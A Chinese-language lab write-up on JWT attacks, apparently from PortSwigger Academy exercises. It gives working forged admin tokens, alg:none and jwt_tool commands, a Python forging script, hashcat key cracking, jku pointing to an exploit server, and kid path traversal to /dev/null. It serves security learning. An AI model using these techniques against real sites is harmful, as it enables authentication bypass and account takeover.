

## JWT attacks

`JWT `通常用于身份验证、会话管理和访问控制机制，这些漏洞可能会危及整个网站及其用户

![jwt-infographic](./img/jwt-infographic.jpg)

## 什么是JWT

`JSON web tokens (JWTs) `

`JSON Web tokens（JWT）`是一种用于在系统之间发送加密签名 `JSON `数据的标准格式

理论上，它们可以包含任何类型的数据，但最常用于发送有关用户的信息，作为身份验证、会话处理和访问控制机制的一部分

与经典`session tokens`不同，服务器所需的所有数据都存储在` JWT `本身中。这使得 `JWT `成为高度分布式网站的首选，在这些网站上，用户需要无缝地与多个后端服务器交互

### JWT 格式

`JWT `由三部分组成：头部(header)、有效载荷(payload)和签名(signature)。这些部分由点分隔，如下面的示例所示：

```jwt
eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
```

`JWT `的头部和payload部分只是 `base64url `编码的` JSON `对象数据

`JWT`解码网站：https://jwt.io/

![image-20250512170508056](./img/image-20250512170508056.png)

在大多数情况下，任何拥有令牌访问权限的人都可以轻松读取或修改这些数据。因此，任何基于` JWT `的机制的安全性高度依赖于**加密签名**。

### JWT 签名

`JWT signature（签名） `

通常，颁发令牌的服务器通过**散列头部（例如：alg:"RS256"）**和有效载荷来生成签名。

在某些情况下，它们还会对生成的散列进行加密。无论如何，这个过程都涉及到一个**秘密签名密钥**

这种机制为服务器提供了一种验证令牌中的数据自颁发以来是否被篡改的方法：

- 由于签名直接从令牌的其余部分派生而来，更改头部或有效载荷中的单个字节会导致签名不匹配
- 不知道服务器的**秘密签名密钥**，就不能够生成给定头部或负载的正确签名

### JWT vs JWS vs JWE

`JWT` 规范实际上非常有限。它仅定义了表示信息（"声明"）的` JSON `对象格式，该格式可以在双方之间传输。在实践中，`JWT  `并不是作为一个独立的实体来使用的

`JWT `规范通过` JSON Web 签名（JWS）`和` JSON Web 加密（JWE）`规范进行了扩展，这些规范定义了实际实现` JWT `的具体方式

![jwt-jws-jwe](./img/jwt-jws-jwe.jpg)

## JWT签名的缺陷漏洞

设计上，服务器通常不会存储它们签发的`JWT `的任何信息，相反，每个`token`都是一个完全自包含的实体。

但是也出现了一个问题，服务器实际上对`token`的原始签名一无所知

因此，如果服务器没有正确验证签名，就无法阻止攻击者对令牌的其余部分进行任意更改

### 接受任意签名

`JWT `库通常提供一种验证令牌的方法和另一种仅解码令牌的方法。例如，`Node.js `库 `jsonwebtoken` 有 `verify()` 和 `decode()`

有时，开发者会混淆这两种方法，只将传入的令牌传递给 `decode()` 方法，这实际上意味着应用程序根本不验证签名。

### 接受未签名的令牌

在`JWT`的头部，`alg`参数代表服务器签名的算法

```
{
    "alg": "HS256",
    "typ": "JWT"
}
```

`JWT` 可以使用多种不同的算法进行签名，但也可以不签名。在这种情况下， `alg` 参数设置为 `none` ，这表示所谓的`未加密 JWT`

这样进行加密的令牌是没有签名部分的，但是结尾需要用`.`结束。例如：

```
eyJraWQiOiI1NzA1YWVkZi0wYmY5LTRjZWMtYTg1MC04YjM0NjViYzVmZTAiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0NzA1NTc1MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```

## 暴力破解密钥

推荐工具：`hashcat`，`JwtCrack`，`john`

```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```

如果多次运行该命令，需要包含 `--show` 标志以输出结果

## JWT 头部参数注入

根据 `JWS `规范，只有 `alg` 头部参数是必须的。

然而，在实践中，`JWT `头部（也称为 `JOSE `头部）通常包含其他几个参数

- `jwk` （`JSON Web Key`） 是一个 `JSON `对象，用来表示密钥
- `jku` （`JSON Web Key Set URL`）提供了一个 URL，服务器可以从该 URL 获取包含正确密钥的密钥集
- `kid` （密钥 ID）提供一个 ID，用来标识验证token该使用哪一个密钥

这些受`用户控制的参数`分别告诉接收服务器在验证签名时应使用哪个密钥

**利用这些参数注入可以使用自己的任意密钥而不是服务器的密钥**

### 通过`JWK`注入自签名

`JWK`（`JSON Web Key`）是一种标准化的格式，用于将密钥表示为` JSON `对象

`JSON Web 签名（JWS）`规范描述了一个可选的 `jwk` 头部参数，服务器可以使用它将**公钥**直接嵌入到令牌本身中，格式为 `JWK`

例如：

```json
{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
```

### 通过`JKU`注入自签名

一些服务器允许您使用 `jku` （`JWK Set URL`）头参数来引用包含该密钥的` JWK Set(JWK 集合)`。在验证签名时，服务器从该 URL 获取相关密钥。

`JWK Set (JWK 集合)`是一个包含表示不同密钥的` JWK `数组的 `JSON `对象

```json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}
```

此类` JWK 集合`有时会通过路径公开，例如 `/.well-known/jwks.json` 

更安全的网站只会从受信任的域中获取密钥，但有时你可以利用 URL 解析差异来绕过这种过滤

### 通过`kid`注入自签名

`JWT `的头部可能包含一个 `kid` （密钥 ID）参数，这用于服务器在**验证签名**时识别使用哪个密钥

验证密钥通常存储为` JWK 集合`。在这种情况下，服务器可能只需查找与令牌相同的 `kid` 的 `JWK`。然而，`JWS `规范并未定义此 ID 的具体结构——它只是开发者选择的任意字符串。例如，他们可能会使用 `kid` 参数指向数据库中的特定条目，甚至是指向文件名

如果指向的是一个文件名，那么我们可以进行目录遍历指向我们已知内容的文件。比如：`linux`下的`/dev/null`指向空字符串

```json
{
    "kid": "../../../../dev/null",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```

如果服务器支持对称算法对`JWT`进行签名，那我们将`kid`文件指向`/dev/null`，然后自己签名也用`空字符串`就可以了

如果服务器将验证密钥存储在数据库中， `kid` 头部参数也可能有` SQL 注入`

## labs

### 未经验证的签名

直接修改`payload`部分，因为根本没有验证签名

![image-20250512204526320](./img/image-20250512204526320.png)

替换payload就行

```python
ewogICAgImlzcyI6ICJwb3J0c3dpZ2dlciIsCiAgICAiZXhwIjogMTc0NzA1NzMxMywKICAgICJzdWIiOiAiYWRtaW5pc3RyYXRvciIKfQ
```

### 缺陷的签名认证

![image-20250512202001564](./img/image-20250512202001564.png)

将头部的`alg`（签名的算法），改为`none`，并删除最后的签名部分

```json
session=eyJraWQiOiI1NzA1YWVkZi0wYmY5LTRjZWMtYTg1MC04YjM0NjViYzVmZTAiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0NzA1NTc1MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```

![image-20250512202223633](./img/image-20250512202223633.png)

成功到管理界面

![image-20250512202317381](./img/image-20250512202317381.png)

或者使用`jwt_tool`工具：https://github.com/ticarpi/jwt_tool

```sh
python3 jwt_tool.py eyJraWQiOiIzYmNkZTA0MC04NzA0LTRkZDUtOGZiZi0xZDA4YWFiYTRkNmMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0NzA1MjUzMCwic3ViIjoid2llbmVyIn0.NE7wTIt_begtJ2C7yIyUi0HhACUQ5G4x3H7QBrEkl9T-ouOCNzVDLSpEUPDYf-SNZIZRFXeTo-M5xtSfJY4efscBaufKo12TfkIqcXARmv2nAyCb5qUwDf5Nf_32WvKkiBgkyJZL_cUtC0IN5SQSN98NoH5xvzU3USHLG8xNg5LwHzmomUsddvj7gCgBYDcVDWljMxCxVVZKkFNWAF6KMUFRgYUTf8eCY3KL53mfT3fFSeUyVmyZa54ET8XkoSNB6LkrPWtVzO-cqug5Zq2LD2TvCh1SaQ_0pdm-aK4ymrN8czbo6sdvwDkhjVfs2p-jVVRAUfPax8y9rxGVgpB2Dg -X a -I -pc sub -pv administrator
```

```python
import jwt

Payload = {
    "iss": "portswigger",
    "exp": 1747056991,
    "sub": "administrator"
}

headers = {
    "kid": "caad9141-602e-49f6-b821-0e6351113cc9",
    "alg": "none"
}
json_web_token = jwt.encode(payload=Payload,key="",algorithm="none",headers=headers)
print(json_web_token)
```

### 弱密钥绕过验证

`JwtCrack`工具

字典：https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

![image-20250519143626677](./img/image-20250519143626677.png)

爆破出密钥：`secret1`

然后就可以任意修改payload部分

![image-20250519143816646](./img/image-20250519143816646.png)

payload

```
eyJraWQiOiJjNTQwMzdmNi01ZWY4LTRjMmUtOTk1ZC0zYjljOGRlYzI1Y2UiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0NzY0MDEwMywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Ii16Bg3LwjBxL4nivhOJX1c2iJGQsyjsdtflphA8UfQ
```

`hashcat`

```sh
hashcat -a 0 -m 16500 eyJraWQiOiJjNTQwMzdmNi01ZWY4LTRjMmUtOTk1ZC0zYjljOGRlYzI1Y2UiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0NzY0MDEwMywic3ViIjoiYWR
taW5pc3RyYXRvciJ9.Ii16Bg3LwjBxL4nivhOJX1c2iJGQsyjsdtflphA8UfQ jwt.secrets.list
```

![image-20250519144420533](./img/image-20250519144420533.png)

`john`

![image-20250519144536874](./img/image-20250519144536874.png)

### JWK 头部注入

初始头部信息

```json
{
    "kid":"6f5da047-9ba5-480b-89dd-a6de2d27689e",
    "alg":"RS256"
}
```

使用`JWT editor`插件

生成一个RSA的密钥

![image-20250519153338775](./img/image-20250519153338775.png)



选择攻击，添加进入`JWK`

![image-20250519153622309](./img/image-20250519153622309.png)

将`payload`中的sub参数改成`administrator`

修改后的头部

```json
{
    "kid": "1e00189d-3bc9-49a5-9605-03f0df893a5c",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "1e00189d-3bc9-49a5-9605-03f0df893a5c",
        "n": "jkFNpj5eafWczBE5jRkF4hIzErrMk9o7iYUMcF1DTzS_XkF7NMP-0PIMH4kgNeCMu3UorWsQV3XZZA8KzujVEjKxRBPMDsfQh5FKpqUl9QhFtlBkw73Ej1DCH3xtDZMKiPNTMOkWbe811c_UJ9a9Hx_JkXhCvMruOIRl9mKwTt-teKRquGLuvmRxiSvPxnL2LPU5Pf4mJhcGYEsEobI6kjlIXbeQNr1esFmk3IvBrMGEXj_xpWwWfQ-iiP8Asiur5yAbHNMk7gLyEGY7ajwtlUH0XI2k4aECC3Izx6FGZuF5lvSCUAxnHWD6zPT7jXX6GIWStjY0trnpUKr4SZCmKQ"
    }
}
```

![image-20250519153945030](./img/image-20250519153945030.png)

这些参数结合在一起形成了一个完整的**RSA公钥**，能够用于加密数据或验证签名

### JKU 头部注入

复制出来公钥`JWK`

![image-20250519173605266](./img/image-20250519173605266.png)

内容如下格式：

```json
{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "1e00189d-3bc9-49a5-9605-03f0df893a5c",
    "n": "jkFNpj5eafWczBE5jRkF4hIzErrMk9o7iYUMcF1DTzS_XkF7NMP-0PIMH4kgNeCMu3UorWsQV3XZZA8KzujVEjKxRBPMDsfQh5FKpqUl9QhFtlBkw73Ej1DCH3xtDZMKiPNTMOkWbe811c_UJ9a9Hx_JkXhCvMruOIRl9mKwTt-teKRquGLuvmRxiSvPxnL2LPU5Pf4mJhcGYEsEobI6kjlIXbeQNr1esFmk3IvBrMGEXj_xpWwWfQ-iiP8Asiur5yAbHNMk7gLyEGY7ajwtlUH0XI2k4aECC3Izx6FGZuF5lvSCUAxnHWD6zPT7jXX6GIWStjY0trnpUKr4SZCmKQ"
}
```

将他放到`keys`集合里

```json
{
    "keys": [
        {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "1e00189d-3bc9-49a5-9605-03f0df893a5c",
    "n": "jkFNpj5eafWczBE5jRkF4hIzErrMk9o7iYUMcF1DTzS_XkF7NMP-0PIMH4kgNeCMu3UorWsQV3XZZA8KzujVEjKxRBPMDsfQh5FKpqUl9QhFtlBkw73Ej1DCH3xtDZMKiPNTMOkWbe811c_UJ9a9Hx_JkXhCvMruOIRl9mKwTt-teKRquGLuvmRxiSvPxnL2LPU5Pf4mJhcGYEsEobI6kjlIXbeQNr1esFmk3IvBrMGEXj_xpWwWfQ-iiP8Asiur5yAbHNMk7gLyEGY7ajwtlUH0XI2k4aECC3Izx6FGZuF5lvSCUAxnHWD6zPT7jXX6GIWStjY0trnpUKr4SZCmKQ"
}
    ]
}
```

然后将的上面的内容放到服务器上

![image-20250519173753853](./img/image-20250519173753853.png)

设置头部添加`JKU`参数

```json
{
    "kid": "1e00189d-3bc9-49a5-9605-03f0df893a5c",
    "alg": "RS256",
    "jku": "https://exploit-0ac0004c046975f58112104101d40092.exploit-server.net/exploit"
}
```

然后用这个公钥重新签名

![image-20250519173912126](./img/image-20250519173912126.png)

成功

![image-20250519155744097](./img/image-20250519155744097.png)

### kid 头部路径遍历

`kid`是服务器用于识别用那个密钥的，他可能是数据库中的数据，也可能是一个文件名

新建个`JWK`,让`k`参数为空的base64编码

![image-20250521222322757](./img/image-20250521222322757.png)

修改sub为管理员，`kid`指向`../../../dev/null`，然后进行签名

![image-20250521222432292](./img/image-20250521222432292.png)

![image-20250521222628828](./img/image-20250521222628828.png)



